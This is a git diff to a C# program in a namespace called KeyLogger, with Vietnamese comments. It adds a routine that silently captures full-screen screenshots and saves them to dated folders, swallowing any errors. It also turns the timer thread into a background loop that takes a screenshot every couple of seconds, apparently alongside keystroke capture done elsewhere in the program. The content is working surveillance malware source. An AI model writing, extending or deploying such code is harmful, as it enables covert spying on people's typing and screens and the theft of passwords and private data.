@@ -112,19 +112,78 @@ namespace KeyLogger
         }
         #endregion              
 
+        #region Chụp màn hình
+        static string imagePath = "Image_";
+        static string imageExtendtion = ".png";
+
+        static int imageCount = 0;
+        static int captureTime = 2000;
+
+        /// <summary>
+        /// Chụp màn hình sau đó lưu vào imagePath
+        /// </summary>
+        static void CaptureScreen()
+        {
+            //Create a new bitmap.
+            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                           Screen.PrimaryScreen.Bounds.Height,
+                                           PixelFormat.Format32bppArgb);
+
+            // Create a graphics object from the bitmap.
+            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+
+            // Chụp ảnh màn hình từ góc trên bên trái xuống góc phải bên dưới
+            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
+                                        Screen.PrimaryScreen.Bounds.Y,
+                                        0,
+                                        0,
+                                        Screen.PrimaryScreen.Bounds.Size,
+                                        CopyPixelOperation.SourceCopy);
+
+            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+
+            if (!Directory.Exists(directoryImage))
+            {
+                Directory.CreateDirectory(directoryImage);
+            }
+            // Lưu ảnh đã chụp vào đường dẫn đã chọn
+            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);
+
+            try
+            {
+                bmpScreenshot.Save(imageName, ImageFormat.Png);
+            }
+            catch
+            {
+
+            }
+            imageCount++;
+        }
+
+        #endregion
+
         #region Timer
         /// <summary>
         /// Tạo 1 luồng song song với việc bắt phím
         /// để lặp lại việc trong 1 khoảng thời gian nhất định
         /// </summary>
+        static int interval = 1;
+
         static void StrartTimer()
         {
             Thread thread = new Thread(() =>
             {
                 while (true)
                 {
-                    Console.WriteLine("Exception K!!");
-                    Thread.Sleep(2000);
+                    Thread.Sleep(1);
+
+                    if(interval % captureTime == 0)
+                        CaptureScreen();
+
+                    interval++;
+
+                    if (interval >= 1000000)
+                        interval = 0;
                 }  
             });
             thread.IsBackground = true;
